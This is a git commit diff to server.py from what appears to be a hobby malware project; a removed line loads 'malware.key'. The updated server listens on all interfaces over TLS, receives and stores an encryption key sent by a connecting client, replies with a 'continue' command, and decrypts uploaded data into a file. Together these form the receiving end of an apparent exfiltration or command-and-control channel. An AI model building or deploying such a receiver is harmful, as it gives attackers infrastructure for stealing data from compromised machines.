1b2930f431f48006706ab78e0738aa056add9a08
Fryderyk200 <146193454+Fryderyk200@users.noreply.github.com>
2024-04-18 21:08:02 +0100

    Update server.py

--- server.py
+++ server.py
@@ -1,26 +1,33 @@
 import socket
+import ssl
 from cryptography.fernet import Fernet
-HOST = ''
+HOST = '0.0.0.0'
 PORT = 9090
 FILE_NAME = 'received.txt'
 
 def load_key():
-    return open("malware.key", "rb").read()
+        try:
+            with open("current_key.key", "rb") as key_file:
+                key = key_file.read()
+                return key
+        except FileNotFoundError:
+            print("Encryption key file not fount")
+            return None
 
 #decrypt message
 def decrypt_message(encrypted_message):
     key = load_key()
+    if key is None:
+        print("No decryption key available")
+        return None
     f = Fernet(key)
     decrypted_message = f.decrypt(encrypted_message)
     return decrypted_message.decode()
 
 def handle_client_connection(conn):
-    received_data = conn.recv(1024).decode('utf-8')
-    print(f"Received from client: {received_data}")
-
-    response_message = 'restart_listener'
+    response_message = 'continue'
     conn.sendall(response_message.encode('utf-8'))
-    print("Sent restart command to client.")
+    print("Sent 'continue' command to client.")
 
     #decrypt data
     encrypted_data = bytearray()
@@ -39,15 +46,32 @@ def handle_client_connection(conn):
         print(f"Failed to decrypt data: {e}")
 
 
-##sockets
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.bind((HOST, PORT))
-    print('Server listening... ')
-    s.listen(1)
+def create_ssl_context():
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
+    return context
 
-    while True:
-        conn, addr = s.accept()
-        print(f"Accepted new connection from: {addr}")
 
-        with conn:
-            handle_client_connection(conn)
+def main():
+    context = create_ssl_context()
+    ##sockets
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        print('Server listening... ')
+        s.listen(5)
+
+        while True:
+            conn, addr = s.accept()
+            print(f"Accepted new connection from: {addr}")
+            with context.wrap_socket(conn, server_side=True) as secure_conn:
+                connected = secure_conn.recv(1024)
+                print(connected)
+                receive_key = secure_conn.recv(1024)
+                with open("current_key.key", "wb") as key_file:
+                    key_file.write(receive_key)
+                print("Received and saved new encryption key.")
+
+                handle_client_connection(secure_conn)
+
+
+main()
